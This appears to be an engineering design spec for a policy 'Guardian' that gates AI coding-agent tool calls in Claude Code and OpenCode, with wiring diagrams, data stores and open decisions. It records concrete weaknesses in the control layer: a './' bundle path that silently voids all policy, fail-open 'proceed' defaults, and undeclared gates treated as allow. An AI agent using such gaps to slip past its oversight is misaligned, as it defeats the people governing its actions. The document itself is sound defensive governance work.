| N24 | P3 | guardian | `mapVerdict()` — AGT verdict **+ the resolved intervention point** → ACS decision; `warn` → `allow` + `policy_references`; `transform`'s `$policy_target` bound → the modification that point's own S10 row declares — `modifications.parameter_overrides` keyed by argument name at the request gate, `modifications.redactions` on the result payload's own path at the result gate (R1.6). A point S10 gives no synthesis rule cannot express a `transform` and throws, reaching the host as an honoured `deny` | call | → N25, → N26 | → N4, → N13 |
| N25 | P3 | guardian | `persistIfcLabels()` — AGT `result_labels` into the `IfcLabels` field ACS provenance carries | call | → S5 | — |
| N26 | P3 | guardian | `createEnvelopeLogSink()` → `sink.write()` — ⚠️ **total**: never throws, never alters a decision. Records the request *before* validation | call | → S6 | — |
| N27 | P3 | guardian | `denyOnInvalidEnvelope()` — schema or bridge failure returns an explicit ACS `deny` **decision**, not a bare error, so the host honors it instead of falling back to posture | call | → N26 | → N4, → N13 |
| N28 | P3 | guardian | `buildServerHello()` — ServerHello: `negotiated_version`, `methods_evaluated`, `selected_transport`, `timeout_config`, `on_decision_failure`. **`methods_evaluated` is the load-bearing one and V4 is what made it so**: it is exactly the set of methods this Guardian dispatches — both `steps/*` gates since V4 added the result one — and it is *checked against the dispatch* rather than trusted, because both directions are wrong and neither is cosmetic. A method declared here that no branch answers claims enforcement that does not exist; a method omitted tells a conformant client, in `handshake.json`'s own words, to treat that gate as ALLOW-by-default. `test/handshake-declares-what-it-evaluates.test.ts` derives the truth from a live Guardian. There is no `profiles_accepted` — this responder never shipped one | call | → N26 | → N5, → N14 |
| N54 | P3 | guardian | 🟡 `resolvePolicyTargetArgument(toolName, mapping, point)` — the argument name this tool's policy target is read from and written back to. **One declaration read twice**: N23 uses it to fill the normalised snapshot leaf, N24 uses it to name the `parameter_overrides` key, and a `transform` therefore lands on the argument the call actually carries. It replaces `mapping.yaml`'s `into_argument` literal, which named `command` for every tool and would emit a `WebFetch` redaction against an argument `WebFetch` does not have — measured, and the same reported-applied-but-delivered-original family as risk rows 15 and 17 | call | → N23, → N24 | — |
| N55 | P3 | guardian | 🟡 `annotateEgressDestination()` — the annotator dispatched for the manifest's `egress` entry; reads the step's `raw_command` and answers `{destination}`, which lands at `input.annotations.egress.destination`, `egress.rego`'s own fifth default path. Guardian-originated by AGT's design, exactly as the drift score is. **The Guardian must supply this dispatcher unconditionally**: a manifest declaring an annotator nothing dispatches denies every call with `runtime_error:annotation_failed`, benign ones included (measured) | call | → N30 | — |
| N56 | P3 | guardian | 🟡 `assembleSkillLoadSnapshot()` — a third sibling beside N23's two, for `steps/skillLoad`: `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value`. Sibling rather than a mode, on the rule N23's own header states — each intervention point has its own snapshot shape, and this one shares no member with either tool-call snapshot but `envelope.budgets` | call | → N30 | — |
| N30 | P3.1 | agt-bridge | `evaluateInterventionPoint(point, snapshot)` — Node SDK | call | — | → N24 |
| N31 | P3.1 | agt-bridge | `AgentControl.fromPath(manifest.yaml)` at boot | call | — | → N30 |
| N40 | P5 | conformance | `conformance` runner (`bun run conformance`) — every other package in this repo is a bare noun, so a fifth spelled as a full title would be the only one | call | → N41, → N42, → N43, → N44, → N49 | — |
| N41 | P5 | conformance | intervention-point round trip, validated against `policy-input.schema.json` | call | — | → N47 |
| N42 | P5 | conformance | verdict round trip: AGT verdict → ACS decision → AGT verdict, assert identity | call | — | → N47 |
| N43 | P5 | conformance | `enforced_identity` recomputation check | call | — | → N47 |
| N44 | P5 | conformance | failure-domain check: an AGT evaluation error arrives as an honored `deny`; a delivery failure applies the negotiated posture and writes an audit event | call | — | → N47 |
| N49 | P5 | conformance | trace-pillar check: every attribute `trace/otel-mapping.json` marks required, resolved against the v0.1.0 wire schemas — a row is emittable only when a *wire consumer* could emit it | call | — | → N52 |
| N45 | P5 | conformance | `fetchUpstreamSurfaces()` — AGT wire schemas and enums at `main` | call | → S12 | — |
| N46 | P5 | conformance | `diffSurfaces(pinned, upstream)` — a `PinnedSurfaces` (S11) against an `UpstreamSurfaces` (S12), both passed in rather than read here | call | — | → N53 |
| N47 | P5 | conformance | `renderCoverageMatrix()` — the 8 × 5 cells N41–N44 measure, and nothing else. The retired name is **gated**, not merely retired: `test/invariants.test.ts` strips comments first, then asserts no source file's remaining *code* contains `renderMatrix` — `render.ts`'s own doc comment names it in prose (recording exactly this history) and does not trip the gate, because a comment is not code | call | → U30 | — |
| N52 | P5 | conformance | `renderTraceRows()` — N49's trace-pillar rows. A trace row is an attribute against its wire source, not a point × verdict cell, so it is not a column of the matrix | call | → U33 | — |
| N53 | P5 | conformance | `renderUpstreamDiff()` — N46's surface diff. **V8 builds it and V8 renders it**: its only input is V8's `diffSurfaces()`, so V7 can neither build nor test it, and §V8 of the slices doc carries the row | call | → U31 | — |
| N48 | P5 | conformance | `renderMappingTable()` | call | → U32 | — |
| N50 | P4 | inspector | `tailEnvelopeLog()` | observe | → U20, → U21 | — |
| N51 | P4 | inspector | `tailAuditLog()` — host-side fail-open audit events and negotiated posture | observe | → U23 | — |

### Data Stores

| # | Place | Store | Description |
|---|-------|-------|-------------|
| S1 | P1 | `claude-code.hookmap.yaml` | Claude Code hook names ↔ ACS `steps/*`; ACS decisions ↔ `permissionDecision` / `updatedInput` / `updatedToolOutput` |
| S2 | P2 | `opencode.hookmap.yaml` | OpenCode plugin hooks ↔ ACS `steps/*`; ACS decisions ↔ plugin return values |
| S13 | P1 | `negotiated session config` | ServerHello result: `methods_evaluated`, `timeout_config`, `on_decision_failure`, startup posture. Stored whole — the store round-trips fields it does not name — while only the two this host reads are validated on the way in. **One interface, two implementations** (V3): file-backed at `.acs/sessions/<session_id>.json` for subprocess hosts like Claude Code, in-memory for in-process hosts. A fresh hook process has to read the negotiated posture without asking the Guardian — that is the only situation the posture exists for. `session_id` is untrusted input on a filesystem path and is validated as one safe segment |
| S14 | P1 | `audit sink` | Every fail-open proceed, per §6.4's MUST. JSONL at `.acs/audit.jsonl`. Total by construction, on N26's discipline: it runs on the decision path, so a sink that cannot write degrades observability and never a decision |
| S15 | P2 | `negotiated session config` | Same interface as S13, in-memory implementation — an in-process plugin needs no file |
| S16 | P2 | `audit sink` | Same shape as S14 |
| S3 | P3 | `sessionContext` | Hash-chained entries per `session_id` |
| S4 | P3 | `intent` | Immutable Intent baseline per session |
| S5 | P3 | `provenance` | `origin` / `derived_from` lineage, plus an `IfcLabels` field carrying AGT's labels between steps |
| S6 | P3 | `envelope log` | JSONL of every request and response as parsed, unmodified, at `.acs/envelopes.jsonl` (gitignored — carries raw tool arguments). Paired by JSON-RPC `id` |
| S7 | P3.1 | `manifest.yaml` | Binds the `rego` policy to `data.agt.defaults.verdict`; declares intervention points, tools, approval |
| S8 | P3.1 | `data.agt.defaults.config` | Thresholds, allowlists, pattern lists — the only place policy behaviour is authored. 🟡 V9 adds `egress`, V10 adds `content_hash.enforce`, taking the reached gate classes from three to five. ⚠️ **`egress` must carry an explicit `allowlist`**: with the key absent, `egress.rego` falls back to `input.tool.security_labels`, which is `["shell"]` on every tool this manifest registers, and every destination is then denied |
| S9 | P3.1 | AGT stock bundle | `policy/lib/*.rego` at the pinned ref. Requires the `opa` CLI on PATH |
| S12 | P5 | upstream AGT surfaces | Wire schemas and enums fetched from `main` |

### Shared Data Stores

| # | Store | Description | Read by |
|---|-------|-------------|---------|
| S10 | `mapping.yaml` | The normative ACS ↔ MS-ACS mapping (C1). 🟡 V9 adds the per-tool policy-target argument table N54 resolves, which replaces `into_argument`'s literal | N23, N24, N54 (runtime) and N41, N42, N48 (harness) |
| S11 | `agt.lock` | Pinned upstream AGT ref | N31 (bridge) and N46 (differ) |

**S10 is the load-bearing design choice.** The same mapping file drives the runtime *and* the conformance harness. If the adapter and the claimed mapping ever diverge, the matrix goes red. That is what makes C1 a contract rather than documentation, and it is why C wins R1 in the fit check.

### Wiring

```mermaid
flowchart TB
    subgraph P1["P1: Claude Code session"]
        U1["U1: prompt input"]
        U2["U2: tool permission outcome"]
        U3["U3: rewritten tool output"]
        N1["N1: acs-hook shim"]
        N2["N2: buildEnvelope()"]
        N3["N3: renderDecision()"]
        N4["N4: createGuardianClient().requestDecision()"]
        N5["N5: negotiateSessionConfig()"]
        N6["N6: applyFailurePosture()"]
        N7["N7: validateDecision()"]
        S1["S1: claude-code.hookmap.yaml"]
        S13["S13: negotiated session config"]
        S14["S14: audit sink"]
    end

    subgraph P2["P2: OpenCode session"]
        U10["U10: prompt input"]
        U11["U11: tool decision surface"]
        U12["U12: redacted tool output"]
        N10["N10: acs-plugin shim"]
        N11["N11: buildEnvelope() — same module as N2"]
        N12["N12: renderDecision() — same as N3"]
        N13["N13: createGuardianClient().requestDecision() — same as N4"]
        N14["N14: negotiateSessionConfig() — same as N5"]
        N15["N15: applyFailurePosture() — same as N6"]
        N16["N16: validateDecision() — same as N7"]
        S2["S2: opencode.hookmap.yaml"]
        S15["S15: negotiated session config"]
        S16["S16: audit sink"]
    end

    subgraph P3["P3: ACS Guardian service"]
        N20["N20: POST /acs JSON-RPC"]
        N21["N21: validateEnvelope()"]
        N22["N22: appendContextEntry()"]
        N23["N23: assemblePreToolCallSnapshot() / assemblePostToolCallSnapshot()"]
        N56["N56: assembleSkillLoadSnapshot()"]
        N24["N24: mapVerdict()"]
        N25["N25: persistIfcLabels()"]
        N26["N26: createEnvelopeLogSink()"]
        N27["N27: denyOnInvalidEnvelope()"]
        N28["N28: buildServerHello()"]
        N54["N54: resolvePolicyTargetArgument()"]
        N55["N55: annotateEgressDestination()"]
        S3["S3: sessionContext chain"]
        S4["S4: intent"]
        S5["S5: provenance + IfcLabels"]
        S6["S6: envelope log"]

        subgraph P31["P3.1: AGT bridge"]
            N30["N30: evaluateInterventionPoint()"]
            N31["N31: AgentControl.fromPath()"]
            S7["S7: manifest.yaml"]
            S8["S8: data.agt.defaults.config"]
            S9["S9: AGT stock bundle (pinned)"]
        end
    end

    subgraph P4["P4: Envelope Inspector"]
        U20["U20: envelope stream"]
        U21["U21: decision badge"]
        U22["U22: session chain view"]
        U23["U23: posture badge"]
        N50["N50: tailEnvelopeLog()"]
        N51["N51: tailAuditLog()"]
    end

    subgraph P5["P5: Conformance Report"]
        U30["U30: 8x5 coverage matrix"]
        U31["U31: surface-diff detail"]
        U32["U32: mapping table"]
        U33["U33: trace-pillar row"]
        N40["N40: conformance runner"]
        N41["N41: point round trip"]
        N42["N42: verdict round trip"]
        N43["N43: enforced_identity check"]
        N44["N44: fail-closed check"]
        N49["N49: trace-pillar check"]
        N45["N45: fetchUpstreamSurfaces()"]
        N46["N46: diffSurfaces()"]
        N47["N47: renderCoverageMatrix()"]
        N52["N52: renderTraceRows()"]
        N53["N53: renderUpstreamDiff()"]
        N48["N48: renderMappingTable()"]
        S12["S12: upstream AGT surfaces"]
    end

    subgraph shared["DATA STORES (shared)"]
        S10["S10: mapping.yaml"]
        S11["S11: agt.lock"]
    end

    U1 --> N1
    N1 --> N2
    S1 -.-> N2
    N2 --> N4
    N4 --> N20
    N4 -.-> N7
    N7 --> N3
    N7 -->|no decision| N6
    N6 --> S14
    N6 --> N3
    N5 --> N28
    N5 -.-> S13
    S13 -.-> N6
    S1 -.-> N3
    N3 --> U2
    N3 --> U3

    U10 --> N10
    N10 --> N11
    S2 -.-> N11
    N11 --> N13
    N13 --> N20
    N13 -.-> N16
    N16 --> N12
    N16 -->|no decision| N15
    N15 --> S16
    N15 --> N12
    N14 --> N28
    N14 -.-> S15
    S15 -.-> N15
    S2 -.-> N12
    N12 --> U11
    N12 --> U12

    N20 --> N21
    N21 --> N22
    N21 -->|error| N27
    N22 --> S3
    N22 --> N23
    S3 -.-> N23
    S4 -.-> N23
    S5 -.-> N23
    S10 -.-> N23
    N23 --> N30
    N22 --> N56
    S10 -.-> N54
    N54 -.-> N23
    N54 -.-> N24
    N56 --> N30
    N55 --> N30

    S7 -.-> N31
    S8 -.-> N31
    S9 -.-> N31
    S11 -.-> N31
    N31 -.-> N30
    N30 -.-> N24

    S10 -.-> N24
    N24 --> N25
    N24 --> N26
    N25 --> S5
    N26 --> S6
    N27 --> N26
    N28 --> N26
    N28 -.-> N5
    N28 -.-> N14
    N24 -.-> N4
    N24 -.-> N13
    N27 -.-> N4
    N27 -.-> N13

    S6 -.-> N50
    N50 --> U20
    N50 --> U21
    S3 -.-> U22
    S14 -.-> N51
    S16 -.-> N51
    N51 --> U23

    N40 --> N41
    N40 --> N42
    N40 --> N43
    N40 --> N44
    S10 -.-> N41
    S10 -.-> N42
    N41 -.-> N47
    N42 -.-> N47
    N43 -.-> N47
    N44 -.-> N47
    N40 --> N49
    N49 -.-> N52
    N45 --> S12
    S11 -.-> N46
    S12 -.-> N46
    N46 -.-> N53
    N47 --> U30
    N53 --> U31
    N52 --> U33
    S10 -.-> N48
    N48 --> U32

    classDef ui fill:#ffb6c1,stroke:#d87093,color:#000
    classDef nonui fill:#d3d3d3,stroke:#808080,color:#000
    classDef store fill:#e6e6fa,stroke:#9370db,color:#000

    class U1,U2,U3,U10,U11,U12,U20,U21,U22,U23,U30,U31,U32,U33 ui
    class N1,N2,N3,N4,N5,N6,N7,N10,N11,N12,N13,N14,N15,N16,N20,N21,N22,N23,N24,N25,N26,N27,N28,N30,N31,N40,N41,N42,N43,N44,N45,N46,N47,N48,N49,N50,N51,N52,N53 nonui
    class S1,S2,S3,S4,S5,S6,S7,S8,S9,S10,S11,S12,S13,S14,S15,S16 store
```

### What the breadboard proves

| Requirement | Where it shows up |
|---|---|
| R3.2 — host adapter has zero AGT-specific code | N2/N3/N4 name no AGT concept. The only per-host artifacts are S1 and S2, both pure data |
| R3.3 — AGT bridge has zero host-specific code | N30/N31 receive an assembled snapshot. Nothing in P3.1 knows a host exists |
| R3.4 — second host costs no AGT code | P2 reuses N2/N3/N4 verbatim. Only S2 and the N10 shim are new. ⚠️ **Amended by V5 planning, and the amendment is narrower than it looks** — two adapter changes land beside them, both in `packages/host-adapter` where *both* hosts already share code, and neither in the Guardian, the bridge or AGT: the per-modification landing check §V4 parked here, and `outputs.mirrors`, which exists because OpenCode's result payload carries a **second copy** of the leaf a redaction replaces (risk row 17). A shim-local workaround for that would have been exactly the per-host fork this requirement forbids, so putting it in the shared adapter is what keeps R3.4 true rather than what bends it. V5's own gate asserts zero changed lines under `packages/guardian/src`, `packages/agt-bridge/src`, `policy/lib/` (not `policy/` whole — V5 deliberately edits `policy/manifest.yaml` and `policy/manifest.drift.yaml`, the tool registry, not the pinned policy content), `agt.lock`, `mapping.yaml`, and host #1's own wire contract, `hosts/claude-code/`'s root-level `.ts`/`.yaml` files |
| R6.1 — AGT stays stateless | Every store lives in P3, never P3.1 |
| R6.2 — session state in the Guardian | S3, S4, S5 |
| R1.5 — AGT's evaluation fail-closed survives | N27 returns an explicit `deny` **decision**, so §6.4's "honor any decision that arrives" carries AGT's invariant intact |
| R1.7 — wire posture is negotiated, not hard-coded | N5/N14 negotiate it into S13/S15; N6/N15 apply it and audit every fail-open proceed to S14/S16. ⚠️ **The converse does not yet hold** — V4 measured an audit entry reading `outcome: "proceeded"` for a step the shim then **blocked** (exit 2), because the posture writes before a later seam refuses. "Every proceed is audited" is satisfied; "every audited proceed happened" is not. See §V4's watch-for; the repair is the audit sink's contract, not V4's |
| R1.8 — mandatory fail-closed cases | N7/N16 |
| R1.9 — a refusal denies regardless of posture | N6 reads the failure before it reads the posture: `classifyDeliveryFailure` names the refusal, and it resolves to `deny` without consulting S13's `on_decision_failure`. Closes the four codes N27 cannot address a decision to, from the host's own side |
| R2.5/R2.6 — upstream divergence is a named failure | N45, N46 → N53 → U31 names *what moved*, which is R2.6. ⚠️ **R2.5 asks for more than that chain delivers** — "shows up as a **failing case**" is a re-measurement, not a textual diff, and V8 planning found the chain answers only the second. The reachable half is re-asking V7's own schema question of `main`: the policy input the Guardian would send, validated against `main`'s `policy-input.schema.json`, which fails rather than diffs. The unreachable half is re-running the coverage matrix against `main`, since that evaluates through the AGT **Node SDK** and the SDK at `main` is not published to npm. R2.5 is therefore **partly** satisfied by V8; the matrix-against-`main` half is a slice of its own. See §V8 |

---

## Open decisions

| # | Decision | Status | Why it matters |
|---|----------|--------|----------------|
| ~~D1~~ | R3.6 — confirm OpenCode as host #2, replacing Copilot CLI | ✅ **Decided: confirmed** (V5 planning) | Confirmed by running OpenCode **1.18.15**, not by reading it: the plugin API expresses both gates. ⚠️ *This row said "against an unchanged adapter" — planning's belief, disproved by execution: the adapter changed, two hookmap fields and four load-time gates were added, `loadHookmap` began normalising what it returns, and `governStep` took on the `tools` rule both shims share. (A count of changed files stood here and is gone: it went stale during the review round that followed, which is exactly what every other diff-stat figure in this repo did.) R3.4's real subject survives intact and is the stronger claim — **no per-host fork**, every line in the package both hosts run, host #1's source +0/−0. See the R3.4 Fit Check row.* The "sharpest architectural contrast with Claude Code" turned out to be sharper than this row assumed, and in a way that is the point — Claude Code's shim *writes a document*, OpenCode's hooks return `void` and *mutate what they are handed*, so the same rendered `HostOutput` is applied rather than printed. Two conditions attach, both recorded in §V5 and risk rows 17/18 |
| D2 | R3.7 — swap the runtime too? | Decided: no | Keeps every arm one Microsoft recognizes; costs the vendor-neutrality demonstration |
| ~~D3~~ | R5.4 — hook coverage | ✅ **Decided: the two tool-call hooks, plus `steps/skillLoad`** (V9/V10 planning) | The original reasoning stands and is what picks the third: the eight points AGT consumes are the minimum that proves R1, and coverage beyond them earns its place only by driving a real AGT rule rather than by existing. `steps/skillLoad` does exactly that — it carries a `digest` whose semantics `hooks/skill-load.json` spells out clause for clause as what `policy/lib/content_hash.rego` decides, and no AGT host package has a hook for it. So this is not "one more of the nineteen": it is the first hook where an ACS-only surface drives AGT's unforked bundle, which is R8.3's own question answered by building it. ⚠️ *V9/V10 planning first wrote the denominator as 22 and called V1's 19 stale. Both counts are right for different sets — 22 is every hook payload schema, 19 is the `steps/*` subset, and R5.4 asks about `steps/*` — so V1's figure stands and the claim is three of nineteen. §V10 carries both counts and names the three non-`steps` schemas* |
| D4 | R1.1 — spec `steps/modelCall` for v0.2 as part of this work, or map AGT's two model-call points onto existing hooks and declare the seam | Open | Decides whether this is an implementation project or a spec-and-implementation project |
| D5 | R7.3 — determinism | Open | A scripted transcript demos reliably; a live model demos honestly |
| D6 | Shape selection | **Decided: C** | C is the only shape that proves R1 rather than asserting it |
| ~~D7~~ | F3 — Rego or Cedar for the demo bundle | ✅ **Decided: Rego** | The deciding factor was wrong. Cedar's advantage was removing an external binary, but the SDK ships OPA 0.70.0 as a platform package — so Rego, the canonical binding, costs nothing extra. Verified: stock bundle 105/105 under the bundled OPA |
| ~~D8~~ | Which `on_decision_failure` the reference ships as its default | ✅ **Decided: `proceed`, the spec default** | R1.7 and `handshake.json`'s own `default` both fix it, and V1 already shipped it in `handshakeResponder()`. The original reasoning stands: a security-facing demo that fails open needs the audit trail on screen (U23) to read correctly, which is why V3 pairs the default with S14 and the fail-open proceed count. V3 makes the value deployment-declared (`ACS_ON_DECISION_FAILURE`) so one binary demos both halves, and a value that is neither posture **throws** rather than falling back — guessing a posture from a typo is the silent bypass V3 exists to remove |
| D9 | ⚠️ **New.** Report the `./` bundle-path fail-open upstream to AGT? | Open | A `./`-prefixed `bundle:` silently voids all policy and returns `allow` with no error. It is a fail-open in a governance tool and affects any AGT host, not just us. Reporting is the good-citizen move and consistent with R4.3's non-adversarial framing; it is also unattributed outbound traffic, so it needs an explicit decision before anything is sent |
| ~~D10~~ | R5.3 — does this implementation claim the ACS **Trace** pillar? | ✅ **Decided: no, and V7 measures the non-claim** (N49 → N52 → U33). V7 does not build an exporter; per the evidence note below it could only live in the Guardian, which would be a slice of its own | `specification/v0.1.0/trace/otel-mapping.json` is normative: a deployment emitting OTel for the Trace pillar MUST use its span names and required attributes verbatim, and it maps `steps/toolCallRequest` → `gen_ai.tool.call` by name. `trace/ocsf-mapping.json` is its sibling. V2's envelope log (S6) is a raw JSONL log, deliberately not an OTel or OCSF export, so today we claim neither pillar. R5.3 requires declaring that either way. Settled: the matrix records Trace as an explicit non-claim, and **six of its required span attributes are declared on the wire but never required there — five of them named in the evidence note directly below, and `acs.reasoning` added by N49's measurement (§V7's U33 rows). ⚠️ Corrected twice during V7 execution: first from "have no wire source at all", then from "two"** |

**⚠️ D10 evidence — the Trace pillar is not emittable from the v0.1.0 wire alone.** Read after V2 shipped, against the pinned schemas:

| Required by `trace/otel-mapping.json` | Source in v0.1.0 | Status |
|---|---|---|
| `gen_ai.tool.name` (on `gen_ai.tool.call`) | `payload.tool.name` — `required` | ✅ |
| `acs.capability` (on `gen_ai.tool.call`) | `payload.capability` — **optional**; `hooks/tool-call-request.json` requires only `tool` and `arguments` | ⚠️ A fully conformant envelope may omit it, so a fully conformant span cannot always be built |
| `acs.decision` (on the `acs.decision` span event) | `AcsResult.decision` — `required` | ✅ |
| `acs.evaluator` (on the `acs.decision` span event) | `AcsResult.metadata.evaluator` — **optional**, and `metadata` is itself optional | ⚠️ Declared, never guaranteed |
| `acs.confidence`, `acs.evaluator_version`, `acs.model_id` (conditional, "required when present in the decision envelope") | `AcsResult.metadata.{confidence,evaluator_version,model_id}` — **optional**, under an optional `metadata` | ⚠️ Declared, never guaranteed |

> ⚠️ **Corrected during V7 execution (N49's measurement), and the correction sharpens the finding.** The two rows above previously read *"none — `AcsResult` has no `evaluator` field"*. That is wrong. `response-envelope.json`'s `$defs.AcsResult.properties.metadata.properties` declares exactly `evaluator`, `evaluator_version`, `evaluation_duration_ms`, `model_id` and `confidence`, and `metadata`'s own description states the purpose: *"ACS-defined evaluator and observability metadata … keeping the split clean lets **Trace consumers** key on a stable shape."* The fields exist, and they exist **for this**. What they are not is *required*: `AcsResult.required` is `["type", "acs_version", "request_id", "decision"]`, and `metadata` declares no `required` list of its own. So the red cells stand and V7 still declines the Trace pillar — but for the reason `acs.capability` is red, not for the reason claimed here. Two different reasons an attribute is unemittable, and this table had reported the wrong one.

The consequence is sharper than a missing field, and sharper still now that the field is not missing: a **downstream consumer of the ACS wire cannot emit a conformant trace**, because nothing on the wire is required to carry the evidence. Only the Guardian can, from process-local knowledge the contract does not compel it to send. That cuts against R5.1/R5.2 — V2's whole design is that S6 is readable by anything, and the Inspector proves it by importing nothing. An OTel exporter reading S6 would hit the same wall.

**And this implementation leaves that slot empty.** `AcsDecision` (`packages/guardian/src/map-verdict.ts`) declares no `metadata` member and `mapVerdict` never sets one, so every decision this Guardian sends omits the evaluator identity the spec already has a home for. That is not a v0.2 ask — it is available today, and it is a candidate for a later slice.

The v0.2 ask is correspondingly narrower and more actionable than "add a field": promote `metadata.evaluator` to required on a decision result (or make `metadata` required with `evaluator` required within it), and promote `capability` to required for the tool-call-request hook. This is the second place this project has become a forcing function for v0.2 rather than a consumer of v0.1.0 — see the `steps/modelCall` tension under D4.
